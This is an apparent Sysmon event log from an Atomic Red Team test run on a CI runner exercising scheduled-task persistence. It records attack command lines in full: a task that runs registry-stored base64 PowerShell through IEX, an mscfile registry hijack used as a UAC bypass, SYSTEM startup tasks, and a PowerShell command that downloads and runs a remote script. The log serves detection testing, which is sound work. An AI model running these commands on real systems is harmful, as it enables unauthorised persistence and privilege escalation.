"TimeCreated","Id","Message"
"12/17/2025 7:59:47 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: CreateKey
UtcTime: 2025-12-17 07:59:47.730
ProcessGuid: {f995aebf-5f79-6942-d300-000000000e00}
ProcessId: 7608
Image: C:\Windows\system32\sihost.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:47 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:47.513
ProcessGuid: {f995aebf-62f3-6942-9804-000000000e00}
ProcessId: 5980
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks  /Create /TN ""CompMgmtBypass"" /TR ""compmgmt.msc"" /SC ONLOGON /RL HIGHEST /F 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62f3-6942-9504-000000000e00}
ParentProcessId: 1788
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Classes\mscfile\shell\open\command"" /ve /t REG_EXPAND_SZ /d ""c:\windows\System32\calc.exe"" /f & schtasks /Create /TN ""CompMgmtBypass"" /TR ""compmgmt.msc"" /SC ONLOGON /RL HIGHEST /F & ECHO Let's open the Computer Management console now... & compmgmt.msc
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:46 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:46.442
ProcessGuid: {f995aebf-62f2-6942-9104-000000000e00}
ProcessId: 8596
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_acnotc33.5jn.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:46 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:46.422
ProcessGuid: {f995aebf-62f2-6942-9104-000000000e00}
ProcessId: 8596
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_acnotc33.5jn.ps1
CreationUtcTime: 2025-12-17 07:59:46.422
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:45 AM","22","Dns query:
RuleName: DnsQuery
UtcTime: 2025-12-17 07:59:44.108
ProcessGuid: {f995aebf-62ef-6942-8704-000000000e00}
ProcessId: 3368
QueryName: raw.githubusercontent.com
QueryStatus: 0
QueryResults: ::ffff:185.199.108.133;::ffff:185.199.109.133;::ffff:185.199.110.133;::ffff:185.199.111.133;
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:45 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:45.783
ProcessGuid: {f995aebf-62f1-6942-8f04-000000000e00}
ProcessId: 1276
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_efzokjmw.dso.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:45 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:45.763
ProcessGuid: {f995aebf-62f1-6942-8f04-000000000e00}
ProcessId: 1276
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_efzokjmw.dso.ps1
CreationUtcTime: 2025-12-17 07:59:45.761
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:45 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:45.682
ProcessGuid: {f995aebf-62f1-6942-8f04-000000000e00}
ProcessId: 1276
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$xml = [System.IO.File]::ReadAllText(\""""C:\AtomicRedTeam\atomics\T1053.005\src\T1053_05_SCTASK_HIDDEN_ATTRIB.xml\"""")
Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \""""Root\Microsoft\Windows\TaskScheduler\"""" -MethodName \""""RegisterByXml\"""" -Arguments @{ Force = $true; Xml =$xml; }}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:45 AM","3","Network connection detected:
RuleName: NetworkConnect
UtcTime: 2025-12-17 07:59:44.113
ProcessGuid: {f995aebf-62ef-6942-8704-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
User: runnervm8j6r3\runneradmin
Protocol: tcp
Initiated: true
SourceIsIpv6: false
SourceIp: 10.1.0.123
SourceHostname: runnervm8j6r3.jt0rwfx3lfnermtykercolawfd.bx.internal.cloudapp.net
SourcePort: 53509
SourcePortName: -
DestinationIsIpv6: false
DestinationIp: 185.199.108.133
DestinationHostname: cdn-185-199-108-133.github.com
DestinationPort: 443
DestinationPortName: https"
"12/17/2025 7:59:45 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:45.427
ProcessGuid: {f995aebf-62f1-6942-8e04-000000000e00}
ProcessId: 4540
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks.exe  /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st 07:45
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62f1-6942-8b04-000000000e00}
ParentProcessId: 6460
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f & schtasks.exe /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st 07:45
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:45 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:45.393
ProcessGuid: {f995aebf-62f1-6942-8b04-000000000e00}
ProcessId: 6460
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.7019 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c reg add HKCU\SOFTWARE\ATOMIC-T1053.005 /v test /t REG_SZ /d cGluZyAxMjcuMC4wLjE= /f & schtasks.exe /Create /F /TN ""ATOMIC-T1053.005"" /TR ""cmd /c start /min \""\"" powershell.exe -Command IEX([System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String((Get-ItemProperty -Path HKCU:\\SOFTWARE\\ATOMIC-T1053.005).test)))"" /sc daily /st 07:45
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=9695CF4566DDF878A69C3D419E0DA4EEA87B0F24261AD8E79A3A9C4A9885429C
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:44 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:44.810
ProcessGuid: {f995aebf-62f0-6942-8904-000000000e00}
ProcessId: 5988
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_kacn1usp.ih1.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:44 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:44.788
ProcessGuid: {f995aebf-62f0-6942-8904-000000000e00}
ProcessId: 5988
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_kacn1usp.ih1.ps1
CreationUtcTime: 2025-12-17 07:59:44.788
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:44 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:44.708
ProcessGuid: {f995aebf-62f0-6942-8904-000000000e00}
ProcessId: 5988
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {$xml = [System.IO.File]::ReadAllText(\""""C:\AtomicRedTeam\atomics\T1053.005\src\T1053_005_WMI.xml\"""")
Invoke-CimMethod -ClassName PS_ScheduledTask -NameSpace \""""Root\Microsoft\Windows\TaskScheduler\"""" -MethodName \""""RegisterByXml\"""" -Arguments @{ Force = $true; Xml =$xml; }}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:43 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:43.875
ProcessGuid: {f995aebf-62ef-6942-8704-000000000e00}
ProcessId: 3368
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_3ygixuc1.h5n.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:43 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:43.856
ProcessGuid: {f995aebf-62ef-6942-8704-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_3ygixuc1.h5n.ps1
CreationUtcTime: 2025-12-17 07:59:43.856
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:43 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:43.776
ProcessGuid: {f995aebf-62ef-6942-8704-000000000e00}
ProcessId: 3368
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.5074 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
IEX (iwr \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1\"""" -UseBasicParsing) 
Invoke-MalDoc -macroFile \""""C:\AtomicRedTeam\atomics\T1053.005\src\T1053.005-macrocode.txt\"""" -officeProduct \""""Word\"""" -sub \""""Scheduler\""""}
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=0FF6F2C94BC7E2833A5F7E16DE1622E5DBA70396F31C7D5F56381870317E8C46
ParentProcessGuid: {f995aebf-60ec-6942-5a02-000000000e00}
ParentProcessId: 7900
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.EXE"" -command "". 'D:\a\_temp\76082473-4233-4a75-96ef-919776028fb6.ps1'""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:42 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:42.955
ProcessGuid: {f995aebf-62ee-6942-8504-000000000e00}
ProcessId: 7668
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_cmqfrf3p.xk1.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:42 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:42.932
ProcessGuid: {f995aebf-62ee-6942-8504-000000000e00}
ProcessId: 7668
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_cmqfrf3p.xk1.ps1
CreationUtcTime: 2025-12-17 07:59:42.932
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:42 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:42.545
ProcessGuid: {f995aebf-62ee-6942-8404-000000000e00}
ProcessId: 5360
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: SCHTASKS  /Create /S localhost /RU DOMAIN\user /RP At0micStrong /TN ""Atomic task"" /TR ""C:\windows\system32\cmd.exe"" /SC daily /ST 20:10
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62ee-6942-8204-000000000e00}
ParentProcessId: 1212
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c SCHTASKS /Create /S localhost /RU DOMAIN\user /RP At0micStrong /TN ""Atomic task"" /TR ""C:\windows\system32\cmd.exe"" /SC daily /ST 20:10
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:42 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:42.265
ProcessGuid: {f995aebf-62ee-6942-8104-000000000e00}
ProcessId: 6940
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: SCHTASKS  /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62ee-6942-7f04-000000000e00}
ParentProcessId: 3988
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c SCHTASKS /Create /SC ONCE /TN spawn /TR C:\windows\system32\cmd.exe /ST 20:10
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:41 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:41.985
ProcessGuid: {f995aebf-62ed-6942-7e04-000000000e00}
ProcessId: 3904
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks  /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62ed-6942-7b04-000000000e00}
ParentProcessId: 1392
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c schtasks /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" & schtasks /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:41 AM","1","Process Create:
RuleName: ProcessCreate
UtcTime: 2025-12-17 07:59:41.917
ProcessGuid: {f995aebf-62ed-6942-7d04-000000000e00}
ProcessId: 5268
Image: C:\Windows\System32\schtasks.exe
FileVersion: 10.0.26100.6725 (WinBuild.160101.0800)
Description: Task Scheduler Configuration Tool
Product: Microsoft? Windows? Operating System
Company: Microsoft Corporation
OriginalFileName: schtasks.exe
CommandLine: schtasks  /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" 
CurrentDirectory: C:\Users\RUNNER~1\AppData\Local\Temp\
User: runnervm8j6r3\runneradmin
LogonGuid: {f995aebf-5f78-6942-2100-0c0000000000}
LogonId: 0xC0021
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA256=B96AF3066F0B9DE8A460F77BAAE006C5372A266BE18C561DAA7C7AE8635D399D
ParentProcessGuid: {f995aebf-62ed-6942-7b04-000000000e00}
ParentProcessId: 1392
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c schtasks /create /tn ""T1053_005_OnLogon"" /sc onlogon /tr ""cmd.exe /c calc.exe"" & schtasks /create /tn ""T1053_005_OnStartup"" /sc onstart /ru system /tr ""cmd.exe /c calc.exe""
ParentUser: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:39 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:39.416
ProcessGuid: {f995aebf-62eb-6942-6b04-000000000e00}
ProcessId: 9080
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ffftanyq.qow.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:39 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:39.394
ProcessGuid: {f995aebf-62eb-6942-6b04-000000000e00}
ProcessId: 9080
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_ffftanyq.qow.ps1
CreationUtcTime: 2025-12-17 07:59:39.394
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:39 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: DeleteValue
UtcTime: 2025-12-17 07:59:39.102
ProcessGuid: {f995aebf-62eb-6942-6a04-000000000e00}
ProcessId: 8924
Image: C:\Windows\system32\reg.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\calc
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:38 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: DeleteValue
UtcTime: 2025-12-17 07:59:38.865
ProcessGuid: {f995aebf-62ea-6942-6604-000000000e00}
ProcessId: 6176
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell-backup
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:38 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:38.862
ProcessGuid: {f995aebf-62ea-6942-6604-000000000e00}
ProcessId: 6176
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell
Details: explorer.exe
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:38 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:38.661
ProcessGuid: {f995aebf-62ea-6942-6604-000000000e00}
ProcessId: 6176
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_w4tzqcjd.ztt.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:38 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:38.639
ProcessGuid: {f995aebf-62ea-6942-6604-000000000e00}
ProcessId: 6176
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_w4tzqcjd.ztt.ps1
CreationUtcTime: 2025-12-17 07:59:38.639
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:38 AM","12","Registry object added or deleted:
RuleName: RegistryEvent
EventType: DeleteValue
UtcTime: 2025-12-17 07:59:38.346
ProcessGuid: {f995aebf-62ea-6942-6404-000000000e00}
ProcessId: 7992
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit-backup
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:38 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:38.342
ProcessGuid: {f995aebf-62ea-6942-6404-000000000e00}
ProcessId: 7992
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetObject: HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
Details: C:\Windows\system32\userinit.exe,
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:38 AM","23","File Delete archived:
RuleName: FileDelete
UtcTime: 2025-12-17 07:59:38.147
ProcessGuid: {f995aebf-62ea-6942-6404-000000000e00}
ProcessId: 7992
User: runnervm8j6r3\runneradmin
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_wgthmz4w.anc.ps1
Hashes: SHA256=96AD1146EB96877EAB5942AE0736B82D8B5E2039A80D3D6932665C1A4C87DCF7
IsExecutable: false
Archived: true"
"12/17/2025 7:59:38 AM","11","File created:
RuleName: FileCreate
UtcTime: 2025-12-17 07:59:38.125
ProcessGuid: {f995aebf-62ea-6942-6404-000000000e00}
ProcessId: 7992
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
TargetFilename: C:\Users\runneradmin\AppData\Local\Temp\__PSScriptPolicyTest_wgthmz4w.anc.ps1
CreationUtcTime: 2025-12-17 07:59:38.125
User: runnervm8j6r3\runneradmin"
"12/17/2025 7:59:37 AM","13","Registry value set:
RuleName: RegistryEvent
EventType: SetValue
UtcTime: 2025-12-17 07:59:37.707
ProcessGuid: {f995aebf-5f79-6942-d300-000000000e00}
ProcessId: 7608
Image: C:\Windows\system32\sihost.exe
TargetObject: HKU\S-1-5-21-3430515368-916141482-256631409-500\SOFTWARE\Microsoft\Windows\CurrentVersion\RunNotification\StartupTNoticalc
Details: DWORD (0x00000000)
User: runnervm8j6r3\runneradmin"
